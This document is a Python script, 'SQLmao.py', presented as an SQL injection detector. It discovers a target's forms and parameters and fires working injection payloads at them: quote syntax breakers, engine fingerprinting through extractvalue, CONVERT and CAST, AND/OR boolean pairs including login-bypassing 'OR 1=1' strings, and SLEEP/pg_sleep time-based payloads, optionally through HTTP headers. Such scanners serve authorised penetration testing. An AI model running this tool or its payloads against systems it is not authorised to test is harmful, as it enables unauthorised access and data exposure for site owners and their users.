#!/usr/bin/env python3
"""
SQLmao.py — SQL Injection Detector

Three detection tiers with explicit passivity labels on every finding:

  [PASSIVE]       No server-side state change possible. No rows affected,
                  no access granted, no data read. Pure signal observation.
                    → Error-based (syntax errors, fingerprint errors)
                    → Time-based AND IF() — SLEEP fires but returns 0,
                       so AND evaluates to FALSE → zero rows returned →
                       no auth bypass, even on login forms

  [STATE-TOUCH]   The payload comments out SQL clauses that follow the
                  injection point (e.g. a password check). No rows are
                  returned (SLEEP=0 evaluates to FALSE), but the DB
                  structure of the query was altered. Technically modifies
                  the query beyond observation — flag it, don't hide it.
                    → AND-based boolean with trailing comment

  [STATE-CHANGE]  The payload may grant access that does not exist without
                  the injection (OR expands the result set; on a login form
                  this can authenticate you). Used only as a last resort
                  fallback when passive channels find nothing, and always
                  labelled explicitly. Disable with --no-or-fallback.
                    → OR-based boolean (fallback only)

Detection coverage:
  Error-based  : 10 syntax breakers × 3 comment styles
                 + 17 per-engine fingerprint payloads (confirm engine)
  Boolean      : AND-based first (10 contexts, 3-way comparison vs baseline)
                 then OR-based fallback if AND finds nothing (6 contexts)
  Time-based   : AND IF(1=1,SLEEP)/AND IF(1=2,SLEEP) pair (MySQL/SQLite)
                 AND CASE WHEN (PostgreSQL) — tries numeric IDs 1,2,5,10
                 to maximise chance of matching a row
  Headers      : --headers tests User-Agent, X-Forwarded-For, Referer,
                 X-Real-IP through all channels

Requires: pip install requests

Usage:
    python3 SQLmao.py -u "http://target/login?next=..."
    python3 SQLmao.py -u "http://target/login" --list-forms
    python3 SQLmao.py -u "http://target/login" -p profileID
    python3 SQLmao.py -u "http://target/page.php?id=1"
    python3 SQLmao.py -u "http://target/login" --headers
    python3 SQLmao.py -u "http://target/login" --no-or-fallback   # strict passive
    python3 SQLmao.py -u "http://target/login" --cookie "PHPSESSID=abc" --delay 3
"""

import argparse
import re
import sys
import time
from html.parser import HTMLParser
from urllib.parse import urlparse, parse_qs, urljoin

try:
    import requests
except ImportError:
    print("[!] requests not installed. Run: pip install requests")
    sys.exit(1)

BANNER = r"""
      ███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗  ██████╗ 
      ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔═══██╗
      ███████╗██║   ██║██║     ██╔████╔██║███████║██║   ██║
      ╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██║   ██║
      ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║╚██████╔╝
      ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝

             [ SQL INJECTION DETECTOR ]

       > SELECT * FROM sanity;
       > ERROR: sanity not found

       [*] Testing parameters...
"""

# ─────────────────────────────────────────────────────────────
#  DB error signatures
# ─────────────────────────────────────────────────────────────
DB_ERRORS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your (MySQL|MariaDB)",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"Npgsql\.",
        r"PG::SyntaxError", r"unterminated quoted string at or near",
    ],
    "MSSQL": [
        r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
        r"Warning.*mssql_.*", r"System\.Data\.SqlClient\.SqlException",
        r"Unclosed quotation mark after the character string",
        r"Conversion failed when converting",
    ],
    "Oracle": [
        r"\bORA-\d{4,5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*\Woci_.*", r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"Warning.*sqlite_.*", r"\[SQLITE_ERROR\]", r"unrecognized token",
    ],
    "Generic": [
        r"you have an error in your sql syntax", r"unexpected end of SQL command",
        r"syntax error at or near", r"invalid input syntax",
    ],
}

# ─────────────────────────────────────────────────────────────
#  Error-based payloads  [PASSIVE]
# ─────────────────────────────────────────────────────────────
SYNTAX_BREAKERS = [
    ("'",    "bare single-quote"),
    ('"',    "bare double-quote"),
    ("`",    "bare backtick"),
    ("))",   "extra closing parens"),
    ("\\",   "backslash"),
    ("')",   "quote + close-paren"),
    ('";',   "double-quote + semicolon"),
    ("' --", "quote + dash-dash"),
    ("' #",  "quote + hash"),
    ("'/*",  "quote + block-comment"),
]

FINGERPRINT_PAYLOADS = [
    ("MySQL",      "1 AND extractvalue(1,concat(0x7e,version()))-- -"),
    ("MySQL",      "' AND extractvalue(1,concat(0x7e,version()))-- -"),
    ("MySQL",      "' AND extractvalue(1,concat(0x7e,version()))#"),
    ("MySQL",      "1 AND updatexml(1,concat(0x7e,version()),1)-- -"),
    ("MSSQL",      "1 AND 1=CONVERT(int,@@version)--"),
    ("MSSQL",      "' AND 1=CONVERT(int,@@version)--"),
    ("MSSQL",      "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"),
    ("PostgreSQL", "1 AND 1=CAST(version() AS int)--"),
    ("PostgreSQL", "' AND 1=CAST(version() AS int)--"),
    ("Oracle",     "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -"),
    ("Oracle",     "1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -"),
    ("SQLite",     "1 AND 1=(SELECT 1 FROM sqlite_master WHERE 1=1)-- -"),
    ("SQLite",     "' AND 1=(SELECT 1 FROM sqlite_master WHERE 1=1)-- -"),
]

# ─────────────────────────────────────────────────────────────
#  Boolean payloads
#
#  AND-based [STATE-TOUCH]:
#    - Comments out trailing clauses (e.g. password check)
#    - true_AND ≈ fewer restrictions, false_AND = always-false
#    - Neither can expand a result set beyond what the primary key matches
#    - If a comment kills a password clause: no rows returned anyway
#      (AND 1=1 still needs the primary field to match)
#
#  OR-based [STATE-CHANGE] (fallback):
#    - Can authenticate / expand result set
#    - Used only when AND finds nothing
#    - Labelled explicitly in output
# ─────────────────────────────────────────────────────────────
BOOL_AND = [
    # (label, true_payload, false_payload)
    ("numeric",            "1 AND 1=1-- -",                  "1 AND 1=2-- -"),
    ("numeric #",          "1 AND 1=1#",                     "1 AND 1=2#"),
    ("single-quote",       "test' AND '1'='1'-- -",          "test' AND '1'='2'-- -"),
    ("single-quote #",     "test' AND '1'='1'#",             "test' AND '1'='2'#"),
    ("double-quote",       'test" AND "1"="1"-- -',          'test" AND "1"="2"-- -'),
    ("numeric-paren",      "1) AND 1=1-- -",                 "1) AND 1=2-- -"),
    ("sq-paren",           "test') AND '1'='1'-- -",         "test') AND '1'='2'-- -"),
    ("dq-paren",           'test") AND "1"="1"-- -',         'test") AND "1"="2"-- -'),
    ("numeric-alt",        "1 AND 2>1-- -",                  "1 AND 2<1-- -"),
    ("sq-alt",             "test' AND 'a'='a'-- -",          "test' AND 'a'='b'-- -"),
]

BOOL_OR = [
    ("numeric",            "1 OR 1=1-- -",                   "1 OR 1=2-- -"),
    ("numeric #",          "1 OR 1=1#",                      "1 OR 1=2#"),
    ("single-quote",       "' OR '1'='1'-- -",               "' OR '1'='2'-- -"),
    ("single-quote #",     "' OR '1'='1'#",                  "' OR '1'='2'#"),
    ("double-quote",       '" OR "1"="1"-- -',               '" OR "1"="2"-- -'),
    ("numeric-paren",      "1) OR (1=1-- -",                 "1) OR (1=2-- -"),
]

# ─────────────────────────────────────────────────────────────
#  Time-based payloads  [PASSIVE]
#  AND IF(1=1, SLEEP(t), 0):
#    SLEEP returns 0, so AND evaluates to FALSE → zero rows returned.
#    Login never succeeds. But the database DID execute SLEEP.
#    Confirmation: true payload delays, false payload doesn't.
#
#  We try multiple numeric seed values (1,2,5,10) because SLEEP only
#  fires for rows that match the leading condition (profileID = N).
#  If N doesn't exist, no row is processed and SLEEP never runs.
# ─────────────────────────────────────────────────────────────
TIME_SEEDS = [1, 2, 5, 10]  # numeric IDs to try

TIME_PAYLOADS = [
    # (engine, ctx_label, true_template, false_template)
    # MySQL / MariaDB / SQLite
    ("MySQL", "numeric",
     "{seed} AND IF(1=1,SLEEP({t}),0)-- -",
     "{seed} AND IF(1=2,SLEEP({t}),0)-- -"),
    ("MySQL", "numeric #",
     "{seed} AND IF(1=1,SLEEP({t}),0)#",
     "{seed} AND IF(1=2,SLEEP({t}),0)#"),
    ("MySQL", "single-quote",
     "test' AND IF(1=1,SLEEP({t}),0)-- -",
     "test' AND IF(1=2,SLEEP({t}),0)-- -"),
    ("MySQL", "single-quote #",
     "test' AND IF(1=1,SLEEP({t}),0)#",
     "test' AND IF(1=2,SLEEP({t}),0)#"),
    ("MySQL", "double-quote",
     'test" AND IF(1=1,SLEEP({t}),0)-- -',
     'test" AND IF(1=2,SLEEP({t}),0)-- -'),
    ("MySQL", "numeric-paren",
     "{seed}) AND IF(1=1,SLEEP({t}),0)-- -",
     "{seed}) AND IF(1=2,SLEEP({t}),0)-- -"),
    ("MySQL", "sq-paren",
     "test') AND IF(1=1,SLEEP({t}),0)-- -",
     "test') AND IF(1=2,SLEEP({t}),0)-- -"),
    # PostgreSQL
    ("PostgreSQL", "numeric",
     "{seed} AND (SELECT CASE WHEN 1=1 THEN pg_sleep({t}) ELSE pg_sleep(0) END) IS NOT NULL-- -",
     "{seed} AND (SELECT CASE WHEN 1=2 THEN pg_sleep({t}) ELSE pg_sleep(0) END) IS NOT NULL-- -"),
    ("PostgreSQL", "single-quote",
     "test' AND (SELECT CASE WHEN 1=1 THEN pg_sleep({t}) ELSE pg_sleep(0) END) IS NOT NULL-- -",
     "test' AND (SELECT CASE WHEN 1=2 THEN pg_sleep({t}) ELSE pg_sleep(0) END) IS NOT NULL-- -"),
]

INJECTABLE_HEADERS = ["User-Agent", "X-Forwarded-For", "Referer", "X-Real-IP"]


# ─────────────────────────────────────────────────────────────
#  HTML form discovery
# ─────────────────────────────────────────────────────────────
class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms  = []
        self._cur   = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            self._cur = {"action": attrs.get("action",""),
                         "method": attrs.get("method","get").upper(),
                         "fields": []}
        elif tag in ("input","select","textarea") and self._cur is not None:
            name = attrs.get("name")
            if name:
                self._cur["fields"].append({
                    "name":  name,
                    "value": attrs.get("value",""),
                    "type":  attrs.get("type","text").lower(),
                })

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None


def discover_forms(session, url, timeout):
    try:
        resp = session.get(url, timeout=timeout)
    except requests.RequestException as e:
        print(f"[!] Could not fetch {url}: {e}"); sys.exit(1)

    parser = FormParser()
    parser.feed(resp.text)
    forms = []
    for f in parser.forms:
        action   = urljoin(url, f["action"]) if f["action"] else url
        method   = f["method"] if f["method"] in ("GET","POST") else "GET"
        fields, testable, has_pw = {}, [], False
        for fld in f["fields"]:
            ft, name, val = fld["type"], fld["name"], fld["value"]
            if ft in ("submit","button","image","reset"):
                fields[name] = val or name; continue
            if ft == "file": continue
            if ft == "password": has_pw = True
            if not val:
                val = ("Test123!" if ft=="password"
                       else ("on" if ft in ("checkbox","radio") else "test"))
            fields[name] = val
            testable.append(name)
        forms.append({"method":method, "action":action, "fields":fields,
                      "testable":testable, "has_password":has_pw})
    return forms, resp


# ─────────────────────────────────────────────────────────────
#  Request helpers
# ─────────────────────────────────────────────────────────────
def send(session, method, url, fields, timeout, extra_headers=None):
    hdrs = extra_headers or {}
    try:
        t0 = time.time()
        if method == "GET":
            r = session.get(url, params=fields, headers=hdrs, timeout=timeout)
        else:
            r = session.post(url, data=fields, headers=hdrs, timeout=timeout)
        return r, time.time()-t0
    except requests.RequestException:
        return None, None


def inject_field(session, method, url, fields, target, payload, timeout):
    d = dict(fields); d[target] = payload
    return send(session, method, url, d, timeout)


def inject_header(session, method, url, fields, target, payload, timeout):
    return send(session, method, url, fields, timeout, extra_headers={target: payload})


# ─────────────────────────────────────────────────────────────
#  Detection checks
# ─────────────────────────────────────────────────────────────
def detect_db_error(text):
    for db, patterns in DB_ERRORS.items():
        for p in patterns:
            if re.search(p, text, re.IGNORECASE):
                return db
    return None


def check_error(session, method, url, fields, target, timeout, inject_fn):
    """[PASSIVE] Syntax breakers + fingerprint payloads."""
    for payload, desc in SYNTAX_BREAKERS:
        r, _ = inject_fn(session, method, url, fields, target, payload, timeout)
        if r and detect_db_error(r.text):
            return True, detect_db_error(r.text), payload, f"syntax breaker ({desc})"

    for engine, payload in FINGERPRINT_PAYLOADS:
        r, _ = inject_fn(session, method, url, fields, target, payload, timeout)
        if r and detect_db_error(r.text):
            return True, detect_db_error(r.text), payload, f"fingerprint ({engine})"

    return False, None, None, None


def _bool_pair(session, method, url, fields, target, true_p, false_p,
               baseline_len, baseline_status, timeout, inject_fn):
    """Send one true/false pair, return (detected, ctx_detail) or (False, None)."""
    r_t, _ = inject_fn(session, method, url, fields, target, true_p,  timeout)
    r_f, _ = inject_fn(session, method, url, fields, target, false_p, timeout)
    if r_t is None or r_f is None:
        return False, None

    lt, lf = len(r_t.text), len(r_f.text)
    st, sf = r_t.status_code, r_f.status_code

    if lt != lf or st != sf:
        strong = (abs(lt - baseline_len) < 20) and (abs(lf - baseline_len) >= 20)
        detail = {
            "lens":    (baseline_len, lt, lf),
            "payloads": (true_p, false_p),
            "strong":   strong,
        }
        return True, detail
    return False, None


def check_boolean(session, method, url, fields, target,
                  baseline_len, baseline_status, timeout, inject_fn,
                  allow_or_fallback):
    """Try AND first [STATE-TOUCH], fall back to OR [STATE-CHANGE] if requested."""

    # AND-based
    for ctx, true_p, false_p in BOOL_AND:
        ok, detail = _bool_pair(session, method, url, fields, target,
                                true_p, false_p, baseline_len, baseline_status,
                                timeout, inject_fn)
        if ok:
            return True, ctx, detail, "STATE-TOUCH"

    if not allow_or_fallback:
        return False, None, None, None

    # OR-based fallback
    for ctx, true_p, false_p in BOOL_OR:
        ok, detail = _bool_pair(session, method, url, fields, target,
                                true_p, false_p, baseline_len, baseline_status,
                                timeout, inject_fn)
        if ok:
            return True, ctx, detail, "STATE-CHANGE"

    return False, None, None, None


def check_time(session, method, url, fields, target,
               baseline_elapsed, delay, timeout, inject_fn):
    """[PASSIVE] AND IF(1=1,SLEEP,0) vs AND IF(1=2,SLEEP,0)."""
    jitter = 1.0

    for engine, ctx, true_t, false_t in TIME_PAYLOADS:
        seeds = TIME_SEEDS if "{seed}" in true_t else [None]
        for seed in seeds:
            tp = true_t.format(t=delay, seed=seed)
            fp = false_t.format(t=delay, seed=seed)

            _, et = inject_fn(session, method, url, fields, target, tp,
                              timeout + delay + 2)
            if et is None or et - baseline_elapsed < delay - jitter:
                continue

            # True delayed — confirm false doesn't
            _, ef = inject_fn(session, method, url, fields, target, fp, timeout + 3)
            if ef is None:
                continue

            if ef - baseline_elapsed < delay - jitter:
                return True, engine, ctx, et, ef, tp

    return False, None, None, None, None, None


# ─────────────────────────────────────────────────────────────
#  Per-target runner
# ─────────────────────────────────────────────────────────────
TIER_COLORS = {
    "PASSIVE":      "[PASSIVE]      ",
    "STATE-TOUCH":  "[STATE-TOUCH]  ",
    "STATE-CHANGE": "[STATE-CHANGE] ",
}

def test_target(session, method, url, fields, label, target,
                baseline_len, baseline_status, baseline_elapsed,
                delay, timeout, inject_fn, allow_or_fallback):

    print(f"\n[*] Testing {label}")
    findings = []

    # ── Error-based ─────────────────────────────────────────
    ok, db, payload, stage = check_error(
        session, method, url, fields, target, timeout, inject_fn)
    if ok:
        tier = TIER_COLORS["PASSIVE"]
        print(f"    [+] {tier}Error-based SQLi found ({db})")
        print(f"        stage   : {stage}")
        print(f"        payload : {payload!r}")
        findings.append(("Error-based", db, f"{stage}", "PASSIVE"))
    else:
        print(f"    [-] Error-based : no DB error signature triggered")

    # ── Boolean-blind ────────────────────────────────────────
    ok, ctx, detail, tier_label = check_boolean(
        session, method, url, fields, target,
        baseline_len, baseline_status, timeout, inject_fn, allow_or_fallback)
    if ok:
        tier = TIER_COLORS[tier_label]
        bl, lt, lf = detail["lens"]
        strong = "STRONG " if detail["strong"] else ""
        print(f"    [+] {tier}Boolean-blind SQLi found [{ctx}] — {strong}confirm")
        print(f"        baseline={bl}b  true={lt}b  false={lf}b")
        print(f"        true    : {detail['payloads'][0]!r}")
        print(f"        false   : {detail['payloads'][1]!r}")
        if tier_label == "STATE-CHANGE":
            print(f"        [!] WARNING: OR payload — may have altered session state")
        findings.append(("Boolean-blind", None,
                         f"{ctx}, {strong}confirm ({lt}b vs {lf}b)", tier_label))
    else:
        msg = "no AND/OR response difference" if allow_or_fallback else "no AND response difference"
        print(f"    [-] Boolean-blind : {msg} across any tested context")

    # ── Time-based ───────────────────────────────────────────
    ok, engine, ctx, et, ef, payload = check_time(
        session, method, url, fields, target,
        baseline_elapsed, delay, timeout, inject_fn)
    if ok:
        tier = TIER_COLORS["PASSIVE"]
        print(f"    [+] {tier}Time-based SQLi found ({engine}) [{ctx}]")
        print(f"        true-delay={et:.1f}s  false={ef:.1f}s  (sleep={delay}s)")
        print(f"        payload : {payload!r}")
        findings.append(("Time-based", engine,
                         f"{ctx}, {et:.1f}s true vs {ef:.1f}s false", "PASSIVE"))
    else:
        print(f"    [-] Time-based : no AND IF()-based delay confirmed")

    if findings:
        print(f"    [+] Works here.")
        for type_label, eng, detail_str, tier_label in findings:
            eng_str  = f" ({eng})" if eng else ""
            tier_str = TIER_COLORS[tier_label].strip()
            print(f"    [>>>] VERDICT : {type_label} SQL Injection{eng_str} [{tier_str}]")
            print(f"                   {detail_str}")
    else:
        print(f"    [!] Oh, come on.")

    return findings


# ─────────────────────────────────────────────────────────────
#  Main
# ─────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="SQLmao — SQL injection detector with explicit passivity labelling per finding."
    )
    ap.add_argument("-u", "--url",      required=True)
    ap.add_argument("-p", "--param",    help="Test only this field/param")
    ap.add_argument("--form",           type=int, help="Test only form at this index")
    ap.add_argument("--list-forms",     action="store_true")
    ap.add_argument("--headers",        action="store_true",
                    help=f"Also inject HTTP headers: {', '.join(INJECTABLE_HEADERS)}")
    ap.add_argument("--no-or-fallback", action="store_true",
                    help="Strict passive mode — skip OR-based boolean fallback entirely")
    ap.add_argument("--cookie",         help="Cookie string, e.g. 'PHPSESSID=abc'")
    ap.add_argument("--delay",          type=int, default=5)
    ap.add_argument("--timeout",        type=int, default=10)
    args = ap.parse_args()

    print(BANNER)

    allow_or = not args.no_or_fallback
    mode_str = ("STRICT PASSIVE — AND only, no OR fallback"
                if not allow_or else
                "AWARE — AND first [STATE-TOUCH], OR fallback [STATE-CHANGE] with warnings")
    print(f"[i] Mode: {mode_str}\n")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    if args.cookie:
        session.headers.update({"Cookie": args.cookie})

    forms, _ = discover_forms(session, args.url, args.timeout)

    if not forms:
        parsed = urlparse(args.url)
        qp = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        if not qp:
            print("[!] No <form> found and no query parameters in URL."); sys.exit(1)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        forms = [{"method":"GET","action":base_url,"fields":qp,
                  "testable":list(qp.keys()),"has_password":False}]
        print(f"[*] No <form> found — falling back to URL query params: {', '.join(qp)}\n")
    else:
        print(f"[*] Discovered {len(forms)} form(s):\n")
        for i, f in enumerate(forms):
            tag = "  (login-like)" if f["has_password"] else ""
            print(f"    [{i}] {f['method']} {f['action']}{tag}")
            print(f"        fields: {', '.join(f['testable']) or '(none testable)'}")
        print()

    if args.list_forms:
        return

    if args.form is not None:
        if args.form < 0 or args.form >= len(forms):
            print(f"[!] --form {args.form} out of range"); sys.exit(1)
        forms = [forms[args.form]]

    if args.param:
        for f in forms:
            f["testable"] = [n for n in f["testable"] if n == args.param]

    print("> SELECT * FROM sanity;")
    print("> ERROR: sanity not found")

    all_results = {}

    for form in forms:
        method, action, fields = form["method"], form["action"], form["fields"]
        testable = form["testable"]
        if not testable and not args.headers:
            continue

        print(f"\n{'─'*56}")
        print(f" {method} {action}")
        print(f"{'─'*56}")

        bl_resp, bl_elapsed = send(session, method, action, fields, args.timeout)
        if bl_resp is None:
            print("[!] Cannot reach action URL, skipping."); continue
        bl_len, bl_status = len(bl_resp.text), bl_resp.status_code
        print(f"[*] Baseline : {bl_status}, {bl_len}b, {bl_elapsed:.2f}s\n")

        for field in testable:
            key = f"{action} :: field:{field}"
            all_results[key] = test_target(
                session, method, action, fields,
                f"field: {field}", field,
                bl_len, bl_status, bl_elapsed,
                args.delay, args.timeout, inject_field, allow_or)

        if args.headers:
            for hdr in INJECTABLE_HEADERS:
                key = f"{action} :: header:{hdr}"
                all_results[key] = test_target(
                    session, method, action, fields,
                    f"header: {hdr}", hdr,
                    bl_len, bl_status, bl_elapsed,
                    args.delay, args.timeout, inject_header, allow_or)

    print(f"\n{'='*56}")
    print("[*] Summary")
    print(f"{'='*56}")
    vuln = {k: v for k, v in all_results.items() if v}
    if vuln:
        for key, findings in vuln.items():
            for type_label, eng, detail_str, tier_label in findings:
                eng_str  = f" ({eng})" if eng else ""
                tier_str = TIER_COLORS[tier_label].strip()
                print(f"    [+] {key}")
                print(f"        {type_label}{eng_str} [{tier_str}] — {detail_str}")
    else:
        print("    [!] No injectable targets found.")
    print()


if __name__ == "__main__":
    main()
